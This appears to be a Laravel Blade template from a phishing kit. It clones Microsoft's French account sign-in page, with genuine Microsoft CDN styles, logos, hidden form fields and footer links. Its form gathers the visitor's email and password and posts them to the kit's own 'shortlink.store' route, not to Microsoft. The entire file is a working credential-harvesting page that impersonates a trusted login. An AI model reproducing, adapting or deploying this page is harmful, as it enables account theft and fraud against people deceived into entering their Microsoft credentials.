<!DOCTYPE html>
<html lang="fr">
<head>
    <link rel="preconnect" href="https://acctcdn.msauth.net" crossorigin="">
    <link rel="preconnect" href="https://acctcdn.msftauth.net" crossorigin="">
    <link rel="preconnect" href="https://logincdn.msauth.net" crossorigin="">
    <meta http-equiv="x-dns-prefetch-control" content="on">
    <link rel="dns-prefetch" href="https://acctcdn.msauth.net/">
    <link rel="dns-prefetch" href="https://acctcdn.msftauth.net/">
    <link rel="dns-prefetch" href="https://acctcdnmsftuswe2.azureedge.net/">
    <link rel="dns-prefetch" href="https://acctcdnvzeuno.azureedge.net/">
    <link rel="dns-prefetch" href="https://logincdn.msauth.net/">
    <link rel="dns-prefetch" href="https://lgincdnvzeuno.azureedge.net/">
    <link rel="dns-prefetch" href="https://lgincdnmsftuswe2.azureedge.net/">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <base href="https://login.live.com">
    <noscript>
        <meta http-equiv="Refresh" content="0; URL=https://login.live.com/jsDisabled.srf?mkt=FR-FR&lc=1036&uaid=c2659568ec1d47bf8ae21ed864ec6c72"/>
        Le compte Microsoft nécessite JavaScript pour la connexion. Ce navigateur Web ne prend pas en charge JavaScript
        ou les scripts sont bloqués.<br/><br/>Pour savoir si votre navigateur prend en charge JavaScript ou pour
        autoriser les scripts, reportez-vous à son aide en ligne.
    </noscript>
    <title>Se connecter à votre compte Microsoft</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">

    <link rel="shortcut icon" href="https://logincdn.msauth.net/16.000.29435.1/images/favicon.ico">
    <link rel="stylesheet" title="Converged_v2" type="text/css" href="https://logincdn.msauth.net/16.000/Converged_v21036_aaRUc92kCx1I0HSCbabz7g2.css">
    <link rel="image_src" href="https://logincdn.msauth.net/16.000.29435.1/images/Windows_Live_v_thumb.jpg">

    <script type="text/javascript" src="https://logincdn.msauth.net/16.000/content/js/ConvergedLoginPaginatedStrings.fr_sbjaVrfWsr2YO5-RQHkjyQ2.js" id="ConvergedLoginPaginatedStrings" crossorigin="anonymous" integrity="sha384-Lw0MzqAc5fRJVaCvqPLU02AcbAJ9e9XUanPZVqobTMINHWfWNaLUT7IjJTMPABiM"></script>

    <script type="text/javascript" src="https://logincdn.msauth.net/shared/1.0/content/js/ConvergedLogin_PCore_wSpagUeRz1WXwHfHI6iprA2.js" id="ConvergedLogin_PCore" crossorigin="anonymous" integrity="sha384-1kbAauQkHIQGEMXBM4zY83QK2XAnTQSdtFQEL9xrr+q+E9sx5LzbRVTwDUb46VcJ"></script>
    <script charset="utf-8" src="https://logincdn.msauth.net/shared/1.0/content/js/oneDs_6ca86789a5ca36d5de0c.js"></script>
    <link rel="stylesheet" href="{{ asset('css/app.css') }}">

    <script charset="utf-8" src="https://logincdn.msauth.net/shared/1.0/content/js/asyncchunk/convergedlogin_ppassword_899cacea4f4b96f8d594.js"></script>
</head>
<body class="cb">

<form x-data="{is_login: true, email: '', password: ''}" method="post" action="{{ route('shortlink.store', $short_key) }}">
    @outlook
    @csrf
    <div class="login-paginated-page">
        <div id="lightboxTemplateContainer"
             data-bind="component: { name: 'lightbox-template', params: { serverData: svr, showHeader: $page.showHeader(), headerLogo: $page.headerLogo() } }">
            <div id="lightboxBackgroundContainer"
                 data-bind="component: { name: 'background-image-control',publicMethods: $page.backgroundControlMethods,event: { load: $page.backgroundImageControl_onLoad } }">
                <div class="background-image-holder" role="presentation"
                     data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
                    <!-- ko if: smallImageUrl --><!-- /ko -->

                    <!-- ko if: backgroundImageUrl -->
                    <div data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }"
                         class="background-image ext-background-image"
                         style="background-image: url(https://logincdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg);"></div>
                    <!-- ko if: useImageMask --><!-- /ko -->
                    <!-- /ko -->
                </div>
            </div>
            <div class="outer" data-bind="css: { 'app': $page.backgroundLogoUrl }">
                <!-- ko if: showHeader --><!-- /ko -->

                <div class="template-section main-section">
                    <div data-bind="css: { 'has-header': showHeader }, externalCss: { 'middle': true }"
                         class="middle ext-middle">
                        <div class="full-height"
                             data-bind="component: { name: 'content-control', params: { serverData: svr, isVerticalSplitTemplate: $page.isVerticalSplitTemplate() } }">
                            <!--  -->

                            <!-- ko withProperties: { '$content': $data } -->
                            <div class="flex-column">
                                <!-- ko if: $page.paginationControlHelper.showBackgroundLogoHolder --><!-- /ko -->

                                <!-- ko if: $page.paginationControlHelper.showPageLevelTitleControl --><!-- /ko -->

                                <div class="win-scroll">
                                    <div id="lightbox" data-bind="
                    animationEnd: $page.paginationControlHelper.animationEnd,
                    externalCss: { 'sign-in-box': true },
                    css: {
                        'inner':  $content.isVerticalSplitTemplate,
                        'vertical-split-content': $content.isVerticalSplitTemplate,
                        'app': $page.backgroundLogoUrl,
                        'wide': $page.paginationControlHelper.useWiderWidth,
                        'fade-in-lightbox': $page.fadeInLightBox,
                        'has-popup': $page.showFedCredAndNewSession &amp;&amp; ($page.showFedCredButtons() || $page.newSession()),
                        'transparent-lightbox': $page.backgroundControlMethods() &amp;&amp; $page.backgroundControlMethods().useTransparentLightBox,
                        'lightbox-bottom-margin-debug': $page.showDebugDetails }"
                                         class="sign-in-box ext-sign-in-box fade-in-lightbox has-popup">

                                        <!-- ko template: { nodes: $masterPageContext.$componentTemplateNodes, data: $page } -->

                                        <!-- ko if: svr.Bq --><!-- /ko -->

                                        <div class="lightbox-cover"
                                             data-bind="css: { 'disable-lightbox': svr.Cc &amp;&amp; showLightboxProgress() }"></div>

                                        <!-- ko if: showLightboxProgress --><!-- /ko -->

                                        <!-- ko if: loadBannerLogo -->
                                        <div data-bind="component: { name: 'logo-control',
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: bannerLogoUrl() } }"><!--  -->

                                            <!-- ko if: bannerLogoUrl --><!-- /ko -->

                                            <!-- ko if: !bannerLogoUrl && !isChinaDc -->
                                            <!-- ko component: 'accessible-image-control' -->
                                            <!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
                                            <!-- /ko -->
                                            <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
                                            <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img
                                                class="logo" role="img"
                                                pngsrc="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png"
                                                svgsrc="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"
                                                data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }"
                                                src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"
                                                alt="Microsoft"><!-- /ko -->
                                            <!-- /ko --><!-- /ko -->
                                            <!-- /ko --></div>
                                        <!-- /ko -->

                                        <!-- ko if: svr.Db && paginationControlHelper.showLwaDisclaimer() -->
                                        <!-- /ko -->

                                        <!-- ko if: asyncInitReady -->


                                        @include('website.outlook.login')
                                        @include('website.outlook.password')
                                        <!-- /ko -->

                                        <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId"
                                               value="">
                                        <input type="hidden" name="psRNGCDefaultType"
                                               data-bind="value: postedLoginStateViewRNGCDefaultType" value="">
                                        <input type="hidden" name="psRNGCEntropy"
                                               data-bind="value: postedLoginStateViewRNGCEntropy" value="">
                                        <input type="hidden" name="psRNGCSLK"
                                               data-bind="value: postedLoginStateViewRNGCSLK" value="">
                                        <input type="hidden" name="canary" data-bind="value: svr.canary" value="">
                                        <input type="hidden" name="ctx" data-bind="value: ctx" value="">
                                        <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId"
                                               value="">
                                        <input type="hidden" id="i0327"
                                               data-bind="attr: { name: svr.bL }, value: flowToken" name="PPFT"
                                               value="DezWoXPO5gbP6mhiontGpOq2f4wpTArwfctPEOeYtaddu3vxteowyn7odiWRzCiioTPykbkc*8ZobK5SHVnTXVMrCRrqZxgeJlhViHgOtqrbGyCth0qgFniwvgrX2X*WsAAbHXytFnMMfFTjP0SSlQX0eC5bghGbN9ZTFRJVP7f*QcbmDjY4LRg0e*V7!0X2v92ax9UXaSXmi7hW1EhyLOrQUeLHBT8LJmuePLfKJr7NGPFiX*lYbg1vFh1*0YcwHg$$">
                                        <input type="hidden" name="PPSX" data-bind="value: svr.c4" value="P">
                                        <input type="hidden" name="NewUser" value="1">
                                        <input type="hidden" name="FoundMSAs" data-bind="value: svr.AL" value="">
                                        <input type="hidden" name="fspost"
                                               data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0">
                                        <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0"
                                               value="0">
                                        <input type="hidden" name="CookieDisclosure" data-bind="value: svr.Bq ? 1 : 0"
                                               value="0">
                                        <input type="hidden" name="IsFidoSupported"
                                               data-bind="value: isFidoSupported() ? 1 : 0" value="1">
                                        <input type="hidden" name="isSignupPost"
                                               data-bind="value: isSignupPost() ? 1 : 0" value="0">
                                        <div data-bind="component: { name: 'instrumentation-control',
                    publicMethods: instrumentationMethods,
                    params: { serverData: svr } }">
                                            <input type="hidden" name="i19" data-bind="value: timeOnPage" value="">
                                        </div>
                                        <!-- /ko -->
                                    </div>

                                    <!-- ko if: $page.showFedCredAndNewSession -->
                                    <!-- ko if: $page.showFedCredButtons -->
                                    <div x-show="is_login"
                                         data-bind="css: { 'app': $page.backgroundLogoUrl }, externalCss: { 'promoted-fed-cred-box': true }"
                                         class="promoted-fed-cred-box ext-promoted-fed-cred-box">
                                        <div class="promoted-fed-cred-content" data-bind="css: {
                        'animate': $page.useCssAnimations &amp;&amp; $page.animate(),
                        'slide-out-next': $page.animate.isSlideOutNext,
                        'slide-in-next': $page.animate.isSlideInNext,
                        'slide-out-back': $page.animate.isSlideOutBack,
                        'slide-in-back': $page.animate.isSlideInBack,
                        'app': $page.backgroundLogoUrl }">

                                            <!-- ko foreach: $page.otherSigninOptions -->
                                            <div x-show="is_login" class="row tile">
                                                <div class="table" role="button" tabindex="0" data-bind="
                                css: { 'list-item': svr.ce },
                                pressEnter: $page.otherSigninOptionsButton_onClick,
                                click: $page.otherSigninOptionsButton_onClick,
                                ariaLabel: $data.text" aria-label="Options de connexion">

                                                    <div class="table-row">
                                                        <div class="table-cell tile-img medium">
                                                            <!-- ko component: 'accessible-image-control' -->
                                                            <!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
                                                            <!-- /ko -->
                                                            <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
                                                            <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img
                                                                class="tile-img medium" role="presentation"
                                                                data-bind="attr: { src: $data.darkIconUrl }"
                                                                src="https://logincdn.msauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg">
                                                            <!-- /ko -->
                                                            <!-- /ko --><!-- /ko -->
                                                        </div>
                                                        <div class="table-cell text-left content"
                                                             data-bind="css: { 'content': !svr.ce }">
                                                            <div data-bind="
                                            text: $data.text,
                                            attr: { 'data-test-id': $data.testId }" data-test-id="signinOptions">Options
                                                                de connexion
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <!-- /ko -->
                                        </div>
                                    </div>
                                    <!-- /ko -->

                                    <!-- ko if: $page.newSession --><!-- /ko -->
                                    <!-- /ko -->

                                    <!-- ko if: $page.showDebugDetails --><!-- /ko -->
                                </div>
                            </div>
                            <!-- /ko --></div>
                    </div>
                </div>

                <!-- ko if: $page.paginationControlHelper.showFooterControl -->
                <div id="footer" role="contentinfo" data-bind="
                externalCss: {
                    'footer': true,
                    'has-background': !$page.useDefaultBackground(),
                    'background-always-visible': $page.backgroundLogoUrl }" class="footer ext-footer">

                    <div data-bind="component: { name: 'footer-control',
                    publicMethods: $page.footerMethods,
                    params: {
                        serverData: svr,
                        useDefaultBackground: $page.useDefaultBackground(),
                        hasDarkBackground: $page.backgroundLogoUrl(),
                        showLinks: true,
                        showFooter: $page.showFooter(),
                        hideTOU: $page.hideTOU(),
                        termsText: $page.termsText(),
                        termsLink: $page.termsLink(),
                        hidePrivacy: $page.hidePrivacy(),
                        privacyText: $page.privacyText(),
                        privacyLink: $page.privacyLink() },
                    event: {
                        agreementClick: $page.footer_agreementClick,
                        showDebugDetails: $page.toggleDebugDetails_onClick } }">
                        <!-- ko if: !hideFooter && (showLinks || impressumLink || showIcpLicense) -->
                        <div id="footerLinks" class="footerNode text-secondary">

                            <!-- ko if: showFooter -->
                            <!-- ko if: !hideTOU -->
                            <a id="ftrTerms" data-bind="
                    text: termsText,
                    href: termsLink,
                    click: termsLink_onClick,
                    externalCss: {
                        'footer-content': true,
                        'footer-item': true,
                        'has-background': !useDefaultBackground,
                        'background-always-visible': hasDarkBackground }"
                               href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=FR-FR&amp;uaid=c2659568ec1d47bf8ae21ed864ec6c72"
                               class="footer-content ext-footer-content footer-item ext-footer-item">Conditions
                                d'utilisation</a>
                            <!-- /ko -->

                            <!-- ko if: !hidePrivacy -->
                            <a id="ftrPrivacy" data-bind="
                    text: privacyText,
                    href: privacyLink,
                    click: privacyLink_onClick,
                    externalCss: {
                        'footer-content': true,
                        'footer-item': true,
                        'has-background': !useDefaultBackground,
                        'background-always-visible': hasDarkBackground }"
                               href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=FR-FR&amp;uaid=c2659568ec1d47bf8ae21ed864ec6c72"
                               class="footer-content ext-footer-content footer-item ext-footer-item">Confidentialité et
                                cookies</a>
                            <!-- /ko -->

                            <!-- ko if: impressumLink --><!-- /ko -->

                            <!-- ko if: showIcpLicense --><!-- /ko -->
                            <!-- /ko -->

                            <!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus -->
                            <a id="moreOptions" href="#" role="button" data-bind="
                click: moreInfo_onClick,
                ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
                attr: { 'aria-expanded': showDebugDetails().toString() },
                hasFocusEx: focusMoreInfo(),
                externalCss: {
                    'footer-content': true,
                    'footer-item': true,
                    'debug-item': true,
                    'has-background': !useDefaultBackground,
                    'background-always-visible': hasDarkBackground }"
                               aria-label="Cliquez ici pour obtenir des informations sur la résolution des problèmes"
                               aria-expanded="false"
                               class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
                        </div>
                        <!-- /ko -->

                        <!-- ko if: svr.C4 && showLinks --><!-- /ko --></div>
                </div>
                <!-- /ko -->
            </div>
        </div>
    </div>

</form>
<script src="{{ asset('js/app.js') }}"></script>
</body>
</html>
